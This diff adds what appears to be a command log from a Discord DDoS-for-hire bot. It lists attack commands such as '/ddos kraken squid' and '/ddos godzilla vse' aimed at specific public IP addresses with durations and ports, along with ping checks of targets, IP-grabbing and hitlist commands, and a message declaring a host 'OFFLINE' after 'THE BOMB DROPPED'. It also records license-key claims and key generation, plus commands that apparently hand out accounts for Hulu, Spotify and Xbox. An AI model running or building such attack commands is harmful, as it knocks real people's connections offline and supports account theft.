@@ -1,0 +1,82 @@
+/bugbountu
+/bugbounty
+/claim KEY
+/claim
+/plan
+/tr4p
+/sms
+/accounts
+/xboxcode
+/hulu
+/accounts
+/plan
+/claim TRxcc4TTQglOFyLpK9GE4KkyBSJ9IFmVGmQc7b7WreWxfiGydo
+/plan
+/ddos kraken udp 47.12.215.144 120 80
+/ping 47.12.215.144
+/ddos kraken squid 35.187.132.105 120
+/ping 35.187.132.105
+/ddos kraken squid 35.187.132.105 120 80
+/plan
+/ddos kraken udp 35.187.132.105 120 80
+/methods
+/ddos kraken ovh-smash 144.217.62.152 60
+/ping 144.217.62.152
+/ddos kraken squid     174.105.26.13 60
+/ddos kraken squid 92.30.68.89 60
+/ping 92.30.68.89
+/plan
+/ddos kraken squid     24.112.207.212 120
+/ddos kraken squid     71.72.247.30 120
+/ping     71.72.247.30
+/ddos godzilla vse     71.72.247.30 3544
+/ddos godzilla vse 120 3544
+/checkip 192.168.1.189:3074
+/checkoip 192.168.1.189
+/checkip 24.243.27.124
+/ddos kraken squid 95.25.31.95 120
+/ddos kraken squid 68.103.15.170 120
+/ping 68.103.15.170
+/plan
+/claim TR2bkcWnQiU5J4uC36Dd9yfl6Fwnq8u02n7vUh8yQ99oB6UqHC
+/spotify
+/vpn
+/mega
+/xboxcode
+/vpn
+/tr4p
+/plan
+/ddos
+/plan
+/accounts
+/hulu
+/hulu
+/bugbounty
+/sms
+/sms
+/plan
+/accounts
+/tr4p
+/plan
+/pls dep all
+/pls bal
+/addplan <@697238828938952746> a lot of days
+/generatekey lifetime
+/bugbounty
+/-/-/  63.142.122.4 IS OFFLINE -+- THE BOMB DROPPED /-/-/
+
+/-/-/  63.142.122.4 IS OFFLINE -+- THE BOMB DROPPED /-/-/
+
+/-/-/  63.142.122.4 IS OFFLINE -+- THE BOMB DROPPED /-/-/
+
+/-/-/  63.142.122.4 IS OFFLINE -+- THE BOMB DROPPED /-/-/
+/ddos kraken ovh-smash
+/xboxcode 6000
+/claim PLPAamTB3EP9CoqqA6MUV73UsGSrtaW3jR5Lco3VsgAfINf87R
+/checkip 1.1.1.1
+/plans
+/hitlist
+[Wed Aug 12 2020 20:41:15 GMT-1100 (Samoa Standard Time)] /ping 216.67.42.33
+[Wed Aug 12 2020 20:54:35 GMT-1100 (Samoa Standard Time)] /ping 73.147.43.8
+[Wed Aug 12 2020 20:55:05 GMT-1100 (Samoa Standard Time)] /ping 73.147.43.8
+[Wed Aug 19 2020 19:00:53 GMT-1100 (Samoa Standard Time)] /claim 1BO2DnsP3Lj58H8PuXT0mNIActI2J8GQ2VrloMMtLeoF20MND
